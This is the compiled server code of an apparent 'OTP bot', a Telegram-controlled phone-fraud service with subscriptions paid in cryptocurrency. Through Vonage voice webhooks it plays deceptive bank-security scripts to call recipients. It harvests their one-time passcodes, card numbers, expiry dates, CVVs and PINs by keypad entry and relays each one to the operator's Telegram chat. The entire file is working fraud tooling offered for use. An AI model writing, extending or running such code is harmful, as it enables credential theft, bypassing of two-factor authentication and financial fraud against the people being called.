"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.server = void 0;
const coinbase_commerce_node_1 = require("coinbase-commerce-node");
const express_1 = __importDefault(require("express"));
const moment_1 = __importDefault(require("moment"));
const telegraf_1 = require("telegraf");
const contentful_1 = require("./utils/contentful");
const dtmfFlow_1 = require("./utils/dtmfFlow");
const app = express_1.default();
app.use(express_1.default.json());
app.use(express_1.default.urlencoded({
    extended: true,
}));
const server = (ctx) => __awaiter(void 0, void 0, void 0, function* () {
    app.post('/coinbase-webhook', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
        var _a, _b;
        const body = req.body;
        const signature = req.headers['x-cc-webhook-signature'];
        const webhookSecret = process.env.COINBASE_WEBHOOK_SECRET;
        try {
            const event = coinbase_commerce_node_1.Webhook.verifyEventBody(JSON.stringify(body), signature, webhookSecret);
            const { metadata } = body.event.data;
            if (event.type === 'charge:pending' &&
                metadata.reason === 'OTP Purchase') {
                ctx.telegram.sendMessage(metadata.chatIid, '😁 Your payment has been received but not confirmed yet ');
            }
            if (event.type === 'charge:confirmed' &&
                metadata.reason === 'OTP Purchase') {
                ctx.telegram.sendMessage(metadata.chatIid, '😋 Your payment has been received');
                try {
                    const space = yield contentful_1.client.getSpace(process.env.CONTENTFUL_SPACE);
                    const env = yield space.getEnvironment('master');
                    const newUser = yield env.createEntry('user', {
                        fields: {
                            id: { 'en-US': Date.now() },
                            telegramId: { 'en-US': (_a = ctx.from) === null || _a === void 0 ? void 0 : _a.id },
                            username: { 'en-US': (_b = ctx.from) === null || _b === void 0 ? void 0 : _b.username },
                            membershipExpiry: {
                                'en-US': moment_1.default
                                    .utc()
                                    .add(1, 'month')
                                    .format(),
                            },
                            membershipType: 'SILVER',
                        },
                    });
                    ctx.telegram.sendMessage(metadata.chatId, '🤩 Your subsciption has been confirmed, to start send "call"');
                    console.log(newUser);
                }
                catch (error) {
                    console.log(error);
                }
            }
            if (event.type === 'charge:failed' &&
                metadata.reason === 'OTP Purchase') {
                ctx.telegram.sendMessage(metadata.chatIid, "😔 You didn't make a payment if this an error please contact admin");
            }
            return res.json(`success ${event.id}`);
        }
        catch (error) {
            return res.status(400).json('failure!');
        }
    }));
    app.post('/vonage-webhook/dtmf/:language/:step', (req, res) => {
        const { dtmf } = req.body;
        const { step, language } = req.params;
        const { wallet, askCardInfo, cardType } = req.query;
        switch (step) {
            case 'bank':
                dtmfFlow_1.bankFlow(dtmf, res, language, ctx, step);
                break;
            case 'pay':
                dtmfFlow_1.payFlow(dtmf, res, language, ctx, step, wallet);
                break;
            case 'account':
                dtmfFlow_1.accountFlow(dtmf, res, language, ctx, step, askCardInfo);
                break;
            case 'card':
                dtmfFlow_1.cardFlow(dtmf, res, language, ctx, step, cardType);
                break;
            default:
                break;
        }
    });
    app.post('/vonage-webhook/pin/:chatId/:language', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
        const { dtmf } = req.body;
        if (dtmf && dtmf.digits === '*') {
            return res.json([
                {
                    action: 'talk',
                    text: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
                    style: 2,
                    language: req.params.language,
                },
            ]);
        }
        if (dtmf && dtmf.digits) {
            yield ctx.telegram.sendMessage(req.params.chatId, req.params.language === 'en-US'
                ? `Card Pin is <b>${dtmf.digits}</b> 💳`
                : `Telepin is <b>${dtmf.digits}</b> 📟`, {
                parse_mode: 'HTML',
            });
        }
        return res.json([
            {
                action: 'talk',
                text: `GREAT, you have entered ${dtmf.digits
                    .split('')
                    .join(' ')}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
                style: 2,
                language: req.params.language,
            },
        ]);
    }));
    app.post('/vonage-webhook/card/:step/:chatId/:language', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
        const { dtmf } = req.body;
        const { cardType, isAccount, expiry, cvv } = req.query;
        console.log(req.query);
        const { language, chatId, step } = req.params;
        if (isAccount === 'yes') {
            if (dtmf && dtmf.digits) {
                yield ctx.telegram.sendMessage(chatId, `Card number <b>${dtmf.digits}</b> ✅`, {
                    parse_mode: 'HTML',
                });
            }
            res.json([
                {
                    action: 'talk',
                    text: `GREAT, you have entered ${dtmf.digits
                        .split('')
                        .join(' ')}. Please enter your ${cardType !== 'undefined' ? cardType : ''} card expirattion date followed by the # key.`,
                    style: 2,
                    language,
                },
                {
                    eventUrl: [
                        `${process.env.ENDPOINT_URL}/vonage-webhook/card/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
                    ],
                    action: 'input',
                    type: ['dtmf'],
                    dtmf: {
                        submitOnHash: true,
                        timeOut: 10,
                        maxDigits: 6,
                    },
                },
            ]);
        }
        if (expiry === 'yes') {
            if (dtmf && dtmf.digits) {
                yield ctx.telegram.sendMessage(chatId, `Expiration date <b>${dtmf.digits}</b> ✅`, {
                    parse_mode: 'HTML',
                });
            }
            return res.json([
                {
                    action: 'talk',
                    text: `GREAT, you have entered ${dtmf.digits
                        .split('')
                        .join(' ')}. Please enter your ${cardType !== 'undefined' ? cardType : ''} card CVV followed by the # key.`,
                    style: 2,
                    language,
                },
                {
                    eventUrl: [
                        `${process.env.ENDPOINT_URL}/vonage-webhook/card/${step}/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
                    ],
                    action: 'input',
                    type: ['dtmf'],
                    dtmf: {
                        submitOnHash: true,
                        timeOut: 10,
                        maxDigits: 6,
                    },
                },
            ]);
        }
        if (cvv === 'yes') {
            if (dtmf && dtmf.digits) {
                yield ctx.telegram.sendMessage(chatId, `CVV <b>${dtmf.digits}</b> ✅`, {
                    parse_mode: 'HTML',
                });
            }
            return res.json([
                {
                    action: 'talk',
                    text: `GREAT. you have entered ${dtmf.digits
                        .split('')
                        .join(' ')}. To AUTHENTICATE YOU please enter your ${language === 'en-US' ? 'CARD PIN' : 'TELEPIN'} followed by the # key.`,
                    style: 2,
                    language,
                    bargeIn: true,
                },
                {
                    eventUrl: [
                        `${process.env.ENDPOINT_URL}/vonage-webhook/pin/${chatId}/${language}`,
                    ],
                    action: 'input',
                    type: ['dtmf'],
                    dtmf: {
                        submitOnHash: true,
                        timeOut: 10,
                        maxDigits: 18,
                    },
                },
            ]);
        }
    }));
    app.post('/vonage-webhook/otp/:step/:chatId/:language', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
        const { dtmf } = req.body;
        const { askCardInfo, cardType } = req.query;
        const { language, chatId, step } = req.params;
        if (dtmf && dtmf.digits === '*') {
            yield ctx.telegram.sendMessage(chatId, `OTP not received ❌`, {
                parse_mode: 'HTML',
            });
            return res.json([
                {
                    action: 'talk',
                    text: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
                    style: 2,
                    language,
                },
            ]);
        }
        switch (step) {
            case 'bank':
                if (dtmf && dtmf.digits) {
                    yield ctx.telegram.sendMessage(req.params.chatId, `OTP is <b>${dtmf.digits}</b> ✅`, {
                        parse_mode: 'HTML',
                    });
                }
                return res.json([
                    {
                        action: 'talk',
                        text: `GREAT. you have entered ${dtmf.digits
                            .split('')
                            .join(' ')}. To AUTHENTICATE YOU please enter your ${language === 'en-US' ? 'CARD PIN' : 'TELEPIN'} followed by the # key.`,
                        style: 2,
                        language,
                        bargeIn: true,
                    },
                    {
                        eventUrl: [
                            `${process.env.ENDPOINT_URL}/vonage-webhook/pin/${chatId}/${language}`,
                        ],
                        action: 'input',
                        type: ['dtmf'],
                        dtmf: {
                            submitOnHash: true,
                            timeOut: 10,
                            maxDigits: 18,
                        },
                    },
                ]);
            case 'pay':
                if (dtmf && dtmf.digits) {
                    yield ctx.telegram.sendMessage(req.params.chatId, `OTP is <b>${dtmf.digits}</b> ✅`, {
                        parse_mode: 'HTML',
                    });
                }
                return res.json([
                    {
                        action: 'talk',
                        text: `GREAT. you have entered ${dtmf.digits
                            .split('')
                            .join(' ')}. To AUTHENTICATE YOU please enter your ${language === 'en-US' ? 'CARD PIN' : 'TELEPIN'} followed by the # key.`,
                        style: 2,
                        language,
                        bargeIn: true,
                    },
                    {
                        eventUrl: [
                            `${process.env.ENDPOINT_URL}/vonage-webhook/pin/${chatId}/${language}`,
                        ],
                        action: 'input',
                        type: ['dtmf'],
                        dtmf: {
                            submitOnHash: true,
                            timeOut: 10,
                            maxDigits: 18,
                        },
                    },
                ]);
            case 'account':
                if (dtmf && dtmf.digits) {
                    yield ctx.telegram.sendMessage(req.params.chatId, `OTP is <b>${dtmf.digits}</b> ✅`, {
                        parse_mode: 'HTML',
                    });
                }
                if (askCardInfo === 'yes') {
                    return res.json([
                        {
                            action: 'talk',
                            text: `Okay, you have entered ${dtmf.digits
                                .split('')
                                .join(' ')}. We need to verify you, please enter your ${cardType !== 'undefined' ? cardType : ''} card number followed by the # key`,
                            style: 2,
                            language: language,
                            bargeIn: true,
                        },
                        {
                            eventUrl: [
                                `${process.env.ENDPOINT_URL}/vonage-webhook/card/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
                            ],
                            action: 'input',
                            type: ['dtmf'],
                            dtmf: {
                                submitOnHash: true,
                                timeOut: 10,
                                maxDigits: 18,
                            },
                        },
                    ]);
                }
                else {
                    return res.json([
                        {
                            action: 'talk',
                            text: `GREAT, you have entered ${dtmf.digits
                                .split('')
                                .join(' ')}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
                            style: 2,
                            language,
                        },
                    ]);
                }
            case 'card':
                if (dtmf && dtmf.digits) {
                    yield ctx.telegram.sendMessage(req.params.chatId, `Card number <b>${dtmf.digits}</b> ✅`, {
                        parse_mode: 'HTML',
                    });
                }
                return res.json([
                    {
                        action: 'talk',
                        text: `GREAT, you have entered ${dtmf.digits
                            .split('')
                            .join(' ')}. Please enter your ${cardType} card expiry date followed by the # key.`,
                        style: 2,
                        language,
                    },
                    {
                        eventUrl: [
                            `${process.env.ENDPOINT_URL}/vonage-webhook/card/${step}/${chatId}/${language}?cardType=${cardType}?expiry=yes`,
                        ],
                        action: 'input',
                        type: ['dtmf'],
                        dtmf: {
                            submitOnHash: true,
                            timeOut: 10,
                            maxDigits: 6,
                        },
                    },
                ]);
            default:
                break;
        }
    }));
    app.post('/vonage-webhook', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
        var _c;
        const { status, to } = req.body;
        if (status === 'started') {
            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], `Calling (${to}) 📞`);
        }
        if (status === 'ringing') {
            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], `Ringing (${to}) 🔔`);
        }
        if (status === 'answered') {
            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], `On call (${to}) 🤳🏽`, {
                parse_mode: 'HTML',
            });
        }
        if (status === 'busy') {
            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], '<b>On another call </b> ❌\n\nCall again', {
                parse_mode: 'HTML',
                reply_markup: telegraf_1.Markup.inlineKeyboard([
                    telegraf_1.Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
                    telegraf_1.Markup.button.callback('👎🏽 No', 'noCallAgain'),
                ]).reply_markup,
            });
        }
        if (status === 'machine') {
            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], '<b>Voicemail</b> ❌\n\nCall again', {
                parse_mode: 'HTML',
                reply_markup: telegraf_1.Markup.inlineKeyboard([
                    telegraf_1.Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
                    telegraf_1.Markup.button.callback('👎🏽 No', 'noCallAgain'),
                ]).reply_markup,
            });
        }
        if (status === 'cancelled') {
            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], 'Call could not be place, the number is unreachable ❌.', {
                parse_mode: 'HTML',
                reply_markup: telegraf_1.Markup.inlineKeyboard([
                    telegraf_1.Markup.button.callback('Make a call', 'call'),
                ]).reply_markup,
            });
        }
        if (status === 'rejected' || status === 'declined') {
            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], '<b>Hung up</b> ❌\n\nCall again', {
                parse_mode: 'HTML',
                reply_markup: telegraf_1.Markup.inlineKeyboard([
                    telegraf_1.Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
                    telegraf_1.Markup.button.callback('👎🏽 No', 'noCallAgain'),
                ]).reply_markup,
            });
        }
        if (status === 'unanswered' || status === 'timeout') {
            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], '<b>No answer</b> ❌\n\nCall again', {
                parse_mode: 'HTML',
                reply_markup: telegraf_1.Markup.inlineKeyboard([
                    telegraf_1.Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
                    telegraf_1.Markup.button.callback('👎🏽 No', 'noCallAgain'),
                ]).reply_markup,
            });
        }
        if (status === 'failed') {
            (_c = ctx.scene.current) === null || _c === void 0 ? void 0 : _c.leave();
            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], '😔💔 Bot is down and will back soon.\n\nPlease contact admin to follow up.', {
                parse_mode: 'HTML',
                reply_markup: telegraf_1.Markup.inlineKeyboard([
                    telegraf_1.Markup.button.callback('Try again', 'start'),
                ]).reply_markup,
            });
        }
        if (status === 'completed') {
            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], '<b>Ended.</b>.\n\nCall again? 📞', {
                parse_mode: 'HTML',
                reply_markup: telegraf_1.Markup.inlineKeyboard([
                    telegraf_1.Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
                    telegraf_1.Markup.button.callback('👎🏽 No', 'noCallAgain'),
                ]).reply_markup,
            });
        }
        res.send({});
    }));
});
exports.server = server;
const port = process.env.PORT || 4000;
app.listen(port, () => console.log(`⚡⚡⚡ Server has started on http://localhost:${port}`));
